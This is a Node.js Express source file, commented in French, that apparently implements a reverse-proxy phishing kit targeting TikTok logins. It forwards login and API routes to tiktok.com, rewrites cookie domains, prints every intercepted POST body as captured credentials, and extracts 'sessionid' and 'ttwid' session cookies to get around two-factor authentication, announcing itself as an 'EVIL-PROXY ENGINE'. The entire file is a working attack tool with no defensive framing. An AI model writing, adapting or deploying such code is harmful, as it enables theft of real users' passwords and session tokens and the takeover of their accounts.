const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 10000;

// On sert le HTML au démarrage
app.use(express.static(path.join(__dirname)));

const proxyOptions = {
    target: 'https://www.tiktok.com',
    changeOrigin: true,
    secure: true,
    cookieDomainRewrite: { "*": "" },
    onProxyReq: (proxyReq, req, res) => {
        // --- INTERCEPTION DES IDENTIFIANTS ---
        if (req.method === 'POST') {
            let body = '';
            req.on('data', chunk => { body += chunk; });
            req.on('end', () => {
                console.log("\n[!] DONNÉES INTERCEPTÉES (POST) :");
                console.log(decodeURIComponent(body));
                console.log("-------------------------------\n");
            });
        }
        proxyReq.setHeader('Referer', 'https://www.tiktok.com/');
    },
    onProxyRes: (proxyRes, req, res) => {
        // --- INTERCEPTION DES COOKIES (SESSION / 2FA) ---
        const cookies = proxyRes.headers['set-cookie'];
        if (cookies) {
            console.log("\n[X] JETONS DE SESSION DÉTECTÉS :");
            cookies.forEach(c => {
                if (c.includes('sessionid') || c.includes('ttwid')) {
                    console.log(">>> CAPTURE : " + c.split(';')[0]);
                }
            });
            console.log("-------------------------------\n");
        }
    }
};

// On applique le proxy sur les routes de login
app.use(['/login', '/passport', '/api'], createProxyMiddleware(proxyOptions));

app.listen(PORT, () => {
    console.log("BACOPS EVIL-PROXY ENGINE ACTIVE");
});
